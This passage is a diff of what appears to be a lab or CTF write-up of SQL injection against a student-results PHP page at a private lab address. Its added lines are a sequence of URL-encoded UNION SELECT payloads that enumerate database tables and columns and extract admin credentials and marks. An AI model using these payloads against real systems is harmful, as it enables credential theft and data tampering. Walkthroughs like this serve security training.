@@ -96,12 +96,28 @@ http://10.10.91.146:20000/classrooms/viewresult.php?seno=146891650%27%20OR%20%27
 
 
 ' UNION SELECT 1,2,3,4 -- -
-
 <img width="964" height="354" alt="image" src="https://github.com/user-attachments/assets/ab91a095-9adc-453b-9a54-f9280b74a06b" />
 
+
 %27%20UNION%20SELECT%201,@@version,3,4%20--%20-
-
-
 <img width="1040" height="358" alt="image" src="https://github.com/user-attachments/assets/6ace65f7-ea6b-4b53-a09f-4624b37658fd" />
 
+
+%27%20UNION%20SELECT%201,database(),3,4%20--%20-
+<img width="905" height="331" alt="image" src="https://github.com/user-attachments/assets/661b194f-aaad-4ce8-b247-aa44e9c0e0aa" />
+
+
+%27%20UNION%20SELECT%201,table_name,3,4%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20-
+<img width="1442" height="670" alt="image" src="https://github.com/user-attachments/assets/39ffa26a-1fdf-4db2-89b7-f38ebd6f7a11" />
+
+
+%27%20UNION%20SELECT%201,column_name,3,4%20FROM%20information_schema.columns%20WHERE%20table_name=%27admin%27%20--%20-
+<img width="1486" height="358" alt="image" src="https://github.com/user-attachments/assets/77d108bd-6f96-4681-a775-02360937bf6d" />
+
+123%27%20UNION%20SELECT%201,%20Aid,%20Apass,%204%20FROM%20admin%20--%20-%20-
+<img width="1134" height="369" alt="image" src="https://github.com/user-attachments/assets/81ca4ee2-616a-4750-b04e-643dcb046a17" />
+
+
+%27%20UNION%20SELECT%201,Eno,Marks,4%20FROM%20result%20--%20-
+<img width="1191" height="435" alt="image" src="https://github.com/user-attachments/assets/acf62b99-920a-4e1b-845c-521810283ee3" />
 
